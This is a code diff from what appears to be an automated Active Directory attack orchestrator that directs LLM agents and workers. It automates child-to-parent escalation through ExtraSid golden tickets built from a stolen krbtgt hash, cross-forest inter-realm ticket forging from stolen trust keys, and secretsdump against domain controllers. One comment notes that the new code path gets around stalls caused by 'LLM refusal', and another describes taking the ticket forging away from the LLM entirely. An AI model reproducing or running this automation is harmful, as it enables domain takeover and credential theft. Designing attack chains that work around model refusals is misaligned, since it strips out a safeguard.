@@ -204,47 +204,91 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
 
         // Child-to-parent escalation (ExtraSid via raiseChild)
         //
-        // When a parent_child trust is discovered and the child domain is dominated,
-        // dispatch a child_to_parent exploit task.  The LLM prompt offers raiseChild
-        // (automated) and manual ExtraSid golden ticket as alternatives.
+        // Dispatches when a child domain is dominated and its parent FQDN is
+        // known. We derive the parent FQDN by stripping the leftmost label of
+        // the dominated child (always valid intra-forest — child FQDN is
+        // `{label}.{parent_fqdn}` by AD construction), then ALSO union with
+        // any explicit parent_child trusts discovered via LDAP enumeration.
+        //
+        // The intra-forest derivation lets us fire immediately on child DA,
+        // bypassing the trust enumeration round-trip — without it we'd block
+        // until `trusted_domains` was populated, which sometimes never
+        // happens (LLM refusal, network, throttle starvation).
         {
             let state = dispatcher.state.read().await;
-            if state.has_domain_admin && !state.trusted_domains.is_empty() {
-                let child_work: Vec<(String, String, String, String)> = state
-                    .trusted_domains
-                    .values()
-                    .filter(|trust| trust.is_parent_child())
-                    .filter_map(|trust| {
-                        let parent_domain = &trust.domain;
+            if state.has_domain_admin {
+                let mut child_work: Vec<(String, String, String, String)> = Vec::new();
 
-                        // Skip if parent is already dominated
+                // Path A: derived intra-forest. For each dominated child (FQDN
+                // with 3+ labels), the parent is `labels[1..].join(".")`.
+                for child_domain in state.dominated_domains.iter() {
+                    let cd_lower = child_domain.to_lowercase();
+                    let labels: Vec<&str> = cd_lower.split('.').collect();
+                    if labels.len() < 3 {
+                        continue;
+                    }
+                    let parent_domain = labels[1..].join(".");
+                    if parent_domain.is_empty() || !parent_domain.contains('.') {
+                        continue;
+                    }
+                    if state.dominated_domains.contains(&parent_domain) {
+                        continue;
+                    }
+                    // Require parent DC IP resolvable (via domain_controllers
+                    // or hosts table) so secretsdump has a target IP.
+                    let parent_dc_ip = match state.resolve_dc_ip(&parent_domain) {
+                        Some(ip) => ip,
+                        None => continue,
+                    };
+                    let key = format!("raise_child:{}", cd_lower);
+                    if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
+                        continue;
+                    }
+                    let child_dc_ip = match state.domain_controllers.get(&cd_lower) {
+                        Some(ip) => ip.clone(),
+                        None => continue,
+                    };
+                    let _ = parent_dc_ip; // resolved later under fresh read lock
+                    child_work.push((key, child_domain.clone(), parent_domain, child_dc_ip));
+                }
+
+                // Path B: explicit parent_child trusts from LDAP enumeration.
+                // Skip duplicates of Path A (same dedup key).
+                if !state.trusted_domains.is_empty() {
+                    for trust in state.trusted_domains.values() {
+                        if !trust.is_parent_child() {
+                            continue;
+                        }
+                        let parent_domain = trust.domain.clone();
                         if state
                             .dominated_domains
                             .contains(&parent_domain.to_lowercase())
                         {
-                            return None;
+                            continue;
                         }
-
-                        // Find a dominated child domain for this parent
-                        // (child FQDN ends with .{parent})
-                        let child_domain = state.dominated_domains.iter().find(|d| {
+                        let child_domain = match state.dominated_domains.iter().find(|d| {
                             d.to_lowercase()
                                 .ends_with(&format!(".{}", parent_domain.to_lowercase()))
-                        })?;
-
+                        }) {
+                            Some(d) => d.clone(),
+                            None => continue,
+                        };
                         let key = format!("raise_child:{}", child_domain.to_lowercase());
                         if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
-                            return None;
+                            continue;
                         }
+                        if child_work.iter().any(|(k, _, _, _)| k == &key) {
+                            continue;
+                        }
+                        let child_dc_ip =
+                            match state.domain_controllers.get(&child_domain.to_lowercase()) {
+                                Some(ip) => ip.clone(),
+                                None => continue,
+                            };
+                        child_work.push((key, child_domain, parent_domain, child_dc_ip));
+                    }
+                }
 
-                        let dc_ip = state
-                            .domain_controllers
-                            .get(&child_domain.to_lowercase())
-                            .cloned()?;
-
-                        Some((key, child_domain.clone(), parent_domain.clone(), dc_ip))
-                    })
-                    .collect();
                 drop(state);
 
                 for (key, child_domain, parent_domain, dc_ip) in child_work {
@@ -349,11 +393,13 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     // ticket creation as alternatives.
                     // `dc_ip` is the child DC (for trust key extraction).
                     // `target` should be the parent DC (for secretsdump after forging ticket).
+                    // Use resolve_dc_ip so the hosts table fills in when
+                    // domain_controllers lacks the parent — falls back to the
+                    // child DC only as a last resort (DCSync can succeed
+                    // against any writable DC in the parent domain).
                     let parent_dc_ip = {
                         let s = dispatcher.state.read().await;
-                        s.domain_controllers
-                            .get(&parent_domain.to_lowercase())
-                            .cloned()
+                        s.resolve_dc_ip(&parent_domain)
                             .unwrap_or_else(|| dc_ip.clone())
                     };
                     let mut payload = json!({
@@ -372,15 +418,161 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             payload[k] = v.clone();
                         }
                     }
-                    // Add domain SIDs if already resolved
-                    {
+                    // Add domain SIDs and child krbtgt (for ExtraSid via child
+                    // krbtgt — preferred path, no inter-realm trust key needed).
+                    //
+                    // The ExtraSid attack requires the PARENT forest SID (RID 519
+                    // = Enterprise Admins). If we ship the child SID by mistake,
+                    // the parent KDC rejects the ticket with KDC_ERR_PREAUTH_FAILED
+                    // because the embedded SID doesn't resolve to a real EA group.
+                    // So if the parent SID isn't cached, resolve it via lookupsid
+                    // against the parent DC using child admin creds (cross-trust
+                    // SAMR works) BEFORE dispatching the exploit task. Defer the
+                    // dispatch (no dedup mark) when resolution fails so the next
+                    // 30s tick can retry once host scans / DC enumeration progress.
+                    let parent_lower = parent_domain.to_lowercase();
+                    let cd_lower = child_domain.to_lowercase();
+                    let (
+                        mut have_target_sid,
+                        mut have_source_sid,
+                        child_admin_cred,
+                        child_admin_hash,
+                        child_dc_ip,
+                    ) = {
                         let s = dispatcher.state.read().await;
-                        if let Some(sid) = s.domain_sids.get(&child_domain.to_lowercase()) {
+                        if let Some(sid) = s.domain_sids.get(&cd_lower) {
                             payload["source_sid"] = json!(sid);
                         }
-                        if let Some(sid) = s.domain_sids.get(&parent_domain.to_lowercase()) {
+                        if let Some(sid) = s.domain_sids.get(&parent_lower) {
                             payload["target_sid"] = json!(sid);
                         }
+                        if let Some(child_krbtgt) = s.hashes.iter().find(|h| {
+                            h.username.eq_ignore_ascii_case("krbtgt")
+                                && h.domain.to_lowercase() == cd_lower
+                                && h.hash_type.to_uppercase() == "NTLM"
+                        }) {
+                            payload["child_krbtgt_hash"] = json!(child_krbtgt.hash_value);
+                        }
+                        let admin_cred = s
+                            .credentials
+                            .iter()
+                            .find(|c| {
+                                c.is_admin
+                                    && !c.password.is_empty()
+                                    && c.domain.to_lowercase() == cd_lower
+                            })
+                            .cloned();
+                        let admin_hash = s
+                            .hashes
+                            .iter()
+                            .find(|h| {
+                                h.username.to_lowercase() == "administrator"
+                                    && h.domain.to_lowercase() == cd_lower
+                                    && h.hash_type.to_uppercase() == "NTLM"
+                            })
+                            .cloned();
+                        let child_dc = s.resolve_dc_ip(&child_domain);
+                        (
+                            s.domain_sids.contains_key(&parent_lower),
+                            s.domain_sids.contains_key(&cd_lower),
+                            admin_cred,
+                            admin_hash,
+                            child_dc,
+                        )
+                    };
+
+                    if !have_target_sid {
+                        if let Some((sid, admin_name)) = super::golden_ticket::resolve_domain_sid(
+                            &parent_domain,
+                            &parent_dc_ip,
+                            child_admin_cred.as_ref(),
+                            child_admin_hash.as_ref(),
+                        )
+                        .await
+                        {
+                            info!(
+                                parent_domain = %parent_domain,
+                                sid = %sid,
+                                "Resolved parent domain SID via lookupsid for child-to-parent ExtraSid"
+                            );
+                            let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                            let reader = ares_core::state::RedisStateReader::new(op_id);
+                            let mut conn = dispatcher.queue.connection();
+                            let _ = reader.set_domain_sid(&mut conn, &parent_lower, &sid).await;
+                            if let Some(ref name) = admin_name {
+                                let _ = reader.set_admin_name(&mut conn, &parent_lower, name).await;
+                            }
+                            {
+                                let mut state = dispatcher.state.write().await;
+                                state.domain_sids.insert(parent_lower.clone(), sid.clone());
+                                if let Some(ref name) = admin_name {
+                                    state.admin_names.insert(parent_lower.clone(), name.clone());
+                                }
+                            }
+                            payload["target_sid"] = json!(sid);
+                            have_target_sid = true;
+                        } else {
+                            warn!(
+                                child_domain = %child_domain,
+                                parent_domain = %parent_domain,
+                                parent_dc_ip = %parent_dc_ip,
+                                "Could not resolve parent SID — deferring child-to-parent dispatch"
+                            );
+                        }
+                    }
+                    if !have_target_sid {
+                        continue;
+                    }
+
+                    // Resolve child domain SID if not cached (needed for ExtraSid golden ticket)
+                    if !have_source_sid {
+                        if let Some(ref child_dc) = child_dc_ip {
+                            if let Some((sid, admin_name)) =
+                                super::golden_ticket::resolve_domain_sid(
+                                    &child_domain,
+                                    child_dc,
+                                    child_admin_cred.as_ref(),
+                                    child_admin_hash.as_ref(),
+                                )
+                                .await
+                            {
+                                info!(
+                                    child_domain = %child_domain,
+                                    sid = %sid,
+                                    "Resolved child domain SID via lookupsid for child-to-parent ExtraSid"
+                                );
+                                let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                                let reader = ares_core::state::RedisStateReader::new(op_id);
+                                let mut conn = dispatcher.queue.connection();
+                                let _ = reader.set_domain_sid(&mut conn, &cd_lower, &sid).await;
+                                if let Some(ref name) = admin_name {
+                                    let _ = reader.set_admin_name(&mut conn, &cd_lower, name).await;
+                                }
+                                {
+                                    let mut state = dispatcher.state.write().await;
+                                    state.domain_sids.insert(cd_lower.clone(), sid.clone());
+                                    if let Some(ref name) = admin_name {
+                                        state.admin_names.insert(cd_lower.clone(), name.clone());
+                                    }
+                                }
+                                payload["source_sid"] = json!(sid);
+                                have_source_sid = true;
+                            } else {
+                                warn!(
+                                    child_domain = %child_domain,
+                                    child_dc_ip = %child_dc,
+                                    "Could not resolve child SID — deferring child-to-parent dispatch"
+                                );
+                            }
+                        } else {
+                            warn!(
+                                child_domain = %child_domain,
+                                "No child DC IP available — deferring child-to-parent dispatch"
+                            );
+                        }
+                    }
+                    if !have_source_sid {
+                        continue;
                     }
 
                     match dispatcher
@@ -566,11 +758,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         }
 
         // Follow trust keys (inter-realm ticket + foreign secretsdump)
-        let (work, admin_cred_phase3, admin_hash_phase3): (
-            Vec<TrustFollowWork>,
-            Option<ares_core::models::Credential>,
-            Option<ares_core::models::Hash>,
-        ) = {
+        //
+        // The deterministic forge uses only the trust key + SIDs (already on
+        // each TrustFollowWork item); admin creds are no longer needed here.
+        let work: Vec<TrustFollowWork> = {
             let state = dispatcher.state.read().await;
 
             // Skip if no domain admin yet — trust extraction requires DA-level creds
@@ -587,29 +778,6 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     .map(|t| (t.flat_name.to_uppercase(), t))
                     .collect();
 
-            let admin_cred = state
-                .credentials
-                .iter()
-                .find(|c| c.is_admin && !c.password.is_empty())
-                .cloned();
-            // Find admin hash from any dominated domain with a DC
-            let admin_hash = if admin_cred.is_none() {
-                state
-                    .domain_controllers
-                    .keys()
-                    .filter(|d| state.dominated_domains.contains(&d.to_lowercase()))
-                    .find_map(|dom| {
-                        state.hashes.iter().find(|h| {
-                            h.username.to_lowercase() == "administrator"
-                                && h.domain.to_lowercase() == dom.to_lowercase()
-                                && h.hash_type.to_uppercase() == "NTLM"
-                        })
-                    })
-                    .cloned()
-            } else {
-                None
-            };
-
             let items = state
                 .hashes
                 .iter()
@@ -618,9 +786,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         return None;
                     }
 
-                    // Only process hashes that match a known trust account
                     let netbios = hash.username.trim_end_matches('$').to_uppercase();
-                    let trust = trust_by_flat.get(&netbios)?;
 
                     // Resolve source domain — fall back to first dominated domain
                     // with a DC when secretsdump output lacks domain prefix
@@ -637,24 +803,44 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     if source_domain.is_empty() {
                         return None;
                     }
+                    let source_lower = source_domain.to_lowercase();
+
+                    // Resolve target FQDN: prefer explicit TrustInfo from LDAP
+                    // enumeration, else derive from known domains where the
+                    // NetBIOS label matches and the FQDN is not the source
+                    // (filters out same-domain machine accounts).
+                    let target_domain = if let Some(t) = trust_by_flat.get(&netbios) {
+                        t.domain.clone()
+                    } else {
+                        state
+                            .domain_controllers
+                            .keys()
+                            .chain(state.dominated_domains.iter())
+                            .find(|d| {
+                                let dl = d.to_lowercase();
+                                dl != source_lower
+                                    && d.split('.')
+                                        .next()
+                                        .map(|label| label.to_uppercase() == netbios)
+                                        .unwrap_or(false)
+                            })
+                            .cloned()?
+                    };
 
                     let dedup_key = format!(
                         "trust_follow:{}:{}",
-                        source_domain.to_lowercase(),
+                        source_lower,
                         hash.username.to_lowercase()
                     );
                     if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                         return None;
                     }
 
-                    // Use the FQDN from the trust relationship — never fall back
-                    // to bare NetBIOS name which produces invalid domain strings.
-                    let target_domain = trust.domain.clone();
-
-                    let target_dc_ip = state
-                        .domain_controllers
-                        .get(&target_domain.to_lowercase())
-                        .cloned();
+                    // Use resolve_dc_ip so we fall back to the hosts table when
+                    // domain_controllers lacks an explicit entry for the foreign
+                    // domain — common for cross-forest trusts where the foreign
+                    // DC is only known via host scan, not LDAP enumeration.
+                    let target_dc_ip = state.resolve_dc_ip(&target_domain);
 
                     let source_domain_sid = state
                         .domain_sids
@@ -665,11 +851,6 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         .get(&target_domain.to_lowercase())
                         .cloned();
 
-                    let source_dc_ip = state
-                        .domain_controllers
-                        .get(&source_domain.to_lowercase())
-                        .cloned();
-
                     Some(TrustFollowWork {
                         dedup_key,
                         hash: hash.clone(),
@@ -678,20 +859,34 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         target_dc_ip,
                         source_domain_sid,
                         target_domain_sid,
-                        source_dc_ip,
                     })
                 })
                 .collect();
 
-            (items, admin_cred, admin_hash)
+            items
         };
 
         for item in work {
             let vuln_id = forest_trust_vuln_id(&item.source_domain, &item.target_domain);
-            let trust_target = item
-                .target_dc_ip
-                .clone()
-                .unwrap_or_else(|| item.target_domain.clone());
+
+            // Defer dispatch when the target DC IP is unknown: impacket needs
+            // a routable -target-ip for both create_inter_realm_ticket and the
+            // forge-and-present secretsdump fallback. Passing the bare domain
+            // string fails fast and burns the dedup key. Re-tick in 30s and
+            // let host scans / trust enum populate the DC entry first.
+            let target_dc_ip = match item.target_dc_ip.clone() {
+                Some(ip) => ip,
+                None => {
+                    debug!(
+                        source = %item.source_domain,
+                        target = %item.target_domain,
+                        trust_account = %item.hash.username,
+                        "Deferring forest trust escalation — target DC IP unresolved"
+                    );
+                    continue;
+                }
+            };
+            let trust_target = target_dc_ip.clone();
             {
                 let mut details = std::collections::HashMap::new();
                 details.insert(
@@ -739,45 +934,163 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 continue;
             }
 
-            // 1. Dispatch inter-realm ticket creation.
-            //    Use field names that match the tool and prompt expectations:
-            //    - `vuln_type` routes to generate_trust_key_prompt
-            //    - `source_sid`/`target_sid` match create_inter_realm_ticket tool
-            //    - `trusted_domain` is read by the trust prompt
-            //    - Include admin creds + dc_ip so the LLM can call get_sid if SIDs are missing
+            // Forge-and-present the inter-realm TGT as a deterministic worker
+            // task — NOT an LLM task. Both `create_inter_realm_ticket` and
+            // `secretsdump_kerberos` run sequentially on the same worker via
+            // `expand_technique_task`, so the ccache file produced by ticketer
+            // is on the same filesystem when secretsdump reads it.
+            //
+            // Routing through the LLM here would launder deterministic values
+            // (NT hash, AES key, SIDs) through token generation — the LLM
+            // would have to copy them out of the rendered prompt into tool
+            // call args, where they get dropped, typo'd, or omitted. The
+            // orchestrator already owns every input; deliver them directly.
+            //
+            // Resolve the target DC hostname so Kerberos auth can match the
+            // SPN baked into the ticket. Falls back to the IP, which works
+            // when the worker can reverse-resolve via DNS.
+            let target_dc_hostname = {
+                let s = dispatcher.state.read().await;
+                s.hosts
+                    .iter()
+                    .find(|h| h.ip == target_dc_ip && !h.hostname.is_empty())
+                    .map(|h| h.hostname.clone())
+                    .or_else(|| {
+                        s.hosts
+                            .iter()
+                            .find(|h| {
+                                (h.is_dc || h.detect_dc())
+                                    && h.hostname.to_lowercase().ends_with(&format!(
+                                        ".{}",
+                                        item.target_domain.to_lowercase()
+                                    ))
+                            })
+                            .map(|h| h.hostname.clone())
+                    })
+                    .unwrap_or_else(|| target_dc_ip.clone())
+            };
+
+            // ticketer writes <username>.ccache in the worker cwd; the
+            // following secretsdump_kerberos call reads it via KRB5CCNAME.
+            let ticket_username = "Administrator";
+            let ticket_path = format!("{ticket_username}.ccache");
+
+            // Resolve missing source SID via lookupsid against the source
+            // DC. ticketer.py needs `--domain-sid` for the source realm to
+            // build a valid PAC; without it the resulting ticket gets
+            // rejected by the target KDC. We have DA on the source domain
+            // (cross-forest forge only fires after DA), so SAMR lookupsid
+            // works with either a password cred or admin NTLM hash.
+            let source_domain_sid = if item.source_domain_sid.is_some() {
+                item.source_domain_sid.clone()
+            } else {
+                let (source_dc_ip, src_cred, src_hash) = {
+                    let s = dispatcher.state.read().await;
+                    let src_lower = item.source_domain.to_lowercase();
+                    let dc = s.resolve_dc_ip(&item.source_domain);
+                    let cred = s
+                        .credentials
+                        .iter()
+                        .find(|c| {
+                            c.is_admin
+                                && !c.password.is_empty()
+                                && c.domain.to_lowercase() == src_lower
+                        })
+                        .cloned();
+                    let h = s
+                        .hashes
+                        .iter()
+                        .find(|h| {
+                            h.username.to_lowercase() == "administrator"
+                                && h.domain.to_lowercase() == src_lower
+                                && h.hash_type.to_uppercase() == "NTLM"
+                        })
+                        .cloned();
+                    (dc, cred, h)
+                };
+                let resolved = if let Some(ref dc_ip) = source_dc_ip {
+                    super::golden_ticket::resolve_domain_sid(
+                        &item.source_domain,
+                        dc_ip,
+                        src_cred.as_ref(),
+                        src_hash.as_ref(),
+                    )
+                    .await
+                } else {
+                    None
+                };
+                if let Some((sid, admin_name)) = resolved {
+                    info!(
+                        source_domain = %item.source_domain,
+                        sid = %sid,
+                        "Resolved source domain SID for cross-forest forge"
+                    );
+                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                    let reader = ares_core::state::RedisStateReader::new(op_id);
+                    let mut conn = dispatcher.queue.connection();
+                    let src_lower = item.source_domain.to_lowercase();
+                    let _ = reader.set_domain_sid(&mut conn, &src_lower, &sid).await;
+                    if let Some(ref name) = admin_name {
+                        let _ = reader.set_admin_name(&mut conn, &src_lower, name).await;
+                    }
+                    {
+                        let mut state = dispatcher.state.write().await;
+                        state.domain_sids.insert(src_lower.clone(), sid.clone());
+                        if let Some(ref name) = admin_name {
+                            state.admin_names.insert(src_lower, name.clone());
+                        }
+                    }
+                    Some(sid)
+                } else {
+                    warn!(
+                        source = %item.source_domain,
+                        target = %item.target_domain,
+                        "Could not resolve source SID — deferring cross-forest forge"
+                    );
+                    None
+                }
+            };
+            if source_domain_sid.is_none() {
+                continue;
+            }
+
             let mut ticket_payload = json!({
-                "technique": "create_inter_realm_ticket",
+                "techniques": ["create_inter_realm_ticket", "secretsdump_kerberos"],
                 "vuln_type": "cross_forest",
-                "domain": item.source_domain,
-                "trusted_domain": item.target_domain,
-                "target_domain": item.target_domain,
-                "target": item.target_dc_ip.as_deref().unwrap_or(&item.target_domain),
-                "trust_key": item.hash.hash_value,
-                "trust_account": item.hash.username,
                 "vuln_id": &vuln_id,
+
+                // create_inter_realm_ticket args
+                "source_domain": &item.source_domain,
+                "target_domain": &item.target_domain,
+                "trust_key": &item.hash.hash_value,
+                "trust_account": &item.hash.username,
+                "username": ticket_username,
+
+                // secretsdump_kerberos args (target = hostname so Kerberos SPN
+                // validation works; target_ip = routable IP for impacket)
+                "target": &target_dc_hostname,
+                "target_ip": &target_dc_ip,
+                "domain": &item.target_domain,
+                "ticket_path": &ticket_path,
+                "dc_ip": &target_dc_ip,
             });
-            if let Some(ref sid) = item.source_domain_sid {
+            if let Some(ref sid) = source_domain_sid {
                 ticket_payload["source_sid"] = json!(sid);
             }
             if let Some(ref sid) = item.target_domain_sid {
                 ticket_payload["target_sid"] = json!(sid);
             }
+            // AES256 trust key — required for Win2016+ target DCs which
+            // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
             if let Some(ref aes) = item.hash.aes_key {
                 ticket_payload["aes_key"] = json!(aes);
             }
-            if let Some(ref dc_ip) = item.source_dc_ip {
-                ticket_payload["dc_ip"] = json!(dc_ip);
-            }
-            if let Some(ref cred) = admin_cred_phase3 {
-                ticket_payload["username"] = json!(cred.username);
-                ticket_payload["password"] = json!(cred.password);
-            } else if let Some(ref hash) = admin_hash_phase3 {
-                ticket_payload["username"] = json!(hash.username);
-                ticket_payload["admin_hash"] = json!(hash.hash_value);
-            }
 
+            // Submit under credential_access task_type so the worker's
+            // expand_technique_task runs both tools deterministically with
+            // the orchestrator-supplied args. No LLM agent involved.
             match dispatcher
-                .throttled_submit("exploit", "privesc", ticket_payload, 1)
+                .throttled_submit("credential_access", "credential_access", ticket_payload, 1)
                 .await
             {
                 Ok(Some(task_id)) => {
@@ -788,7 +1101,8 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         target_domain = %item.target_domain,
                         has_source_sid = item.source_domain_sid.is_some(),
                         has_target_sid = item.target_domain_sid.is_some(),
-                        "Inter-realm ticket task dispatched"
+                        has_aes = item.hash.aes_key.is_some(),
+                        "Cross-forest forge-and-present dispatched (deterministic, no LLM)"
                     );
                     let _ = dispatcher
                         .state
@@ -817,18 +1131,14 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         .await;
                 }
                 Ok(None) => {
-                    debug!("Inter-realm ticket deferred by throttler");
+                    debug!("Cross-forest forge deferred by throttler");
                     continue;
                 }
                 Err(e) => {
-                    warn!(err = %e, "Failed to dispatch inter-realm ticket");
+                    warn!(err = %e, "Failed to dispatch cross-forest forge");
                     continue;
                 }
             }
-
-            // The privesc agent handles the full flow: forge inter-realm ticket →
-            // secretsdump_kerberos against the target DC.  No separate credential_access
-            // dispatch needed (it lacked valid auth and always failed).
 
             // Mark as processed
             dispatcher
@@ -852,7 +1162,6 @@ struct TrustFollowWork {
     target_dc_ip: Option<String>,
     source_domain_sid: Option<String>,
     target_domain_sid: Option<String>,
-    source_dc_ip: Option<String>,
 }
 
 #[cfg(test)]
